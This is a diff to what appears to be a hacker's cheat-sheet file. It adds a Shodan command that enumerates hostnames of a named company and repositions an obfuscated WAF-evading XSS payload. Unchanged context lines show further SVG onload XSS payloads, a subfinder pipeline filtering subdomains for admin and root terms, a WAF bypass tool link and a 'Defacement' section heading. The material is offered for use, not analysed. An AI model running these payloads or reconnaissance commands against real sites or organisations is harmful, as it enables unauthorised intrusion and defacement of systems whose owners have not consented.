@@ -1,5 +1,6 @@
 ========================================================================================================================================
-<s"vg o"nload=al"ert() />
+
+shodan search "org:IBM" --fields hostnames
 
 Google Dork:
 ===========
@@ -36,7 +37,7 @@ subfinder -d target.com -silent | grep -E "admin|administrator|root|sysadmin|sec
 Juicy XSS Payload:
 -------------------
 <!--><svg onload=alert(1)-->.asp<svg onload=alert(document.domain)>
-
+<s"vg o"nload=al"ert() />
 XD :) WAF Bypass Tool: https://github.com/khalilbijjou/WAFNinja
 
 Defacement:
